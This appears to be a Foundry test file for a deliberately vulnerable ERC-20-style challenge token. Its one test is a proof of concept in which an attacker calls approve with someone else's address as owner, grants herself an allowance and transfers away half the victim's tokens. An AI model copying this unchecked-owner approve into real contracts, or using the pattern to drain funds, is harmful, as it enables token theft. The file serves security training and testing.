// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Challenge02.sol";

contract Challenge02Wrapper is Challenge02 {
    constructor() Challenge02("BugToken", "BUG", 18) {}

    function exposedMint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract Challenge02Test is Test {
    Challenge02Wrapper token;
    address alice = vm.addr(1);
    address bob = vm.addr(2);
    address eve = vm.addr(3);


    function setUp() public {
        token = new Challenge02Wrapper();
        token.exposedMint(alice, 100 ether);
    }

    function testAnyoneCanApproveOnBehalfOfOthers() public {
        // Eve sets approval from Alice to herself
        vm.prank(eve);
        token.approve(alice, eve, 100 ether);

        // Eve now transfers tokens from Alice using allowance she just granted herself
        vm.prank(eve);
        token.transferFrom(alice, eve, 50 ether);

        // Check Eve received the tokens
        assertEq(token.balanceOf(eve), 50 ether);
        assertEq(token.balanceOf(alice), 50 ether);
    }
}
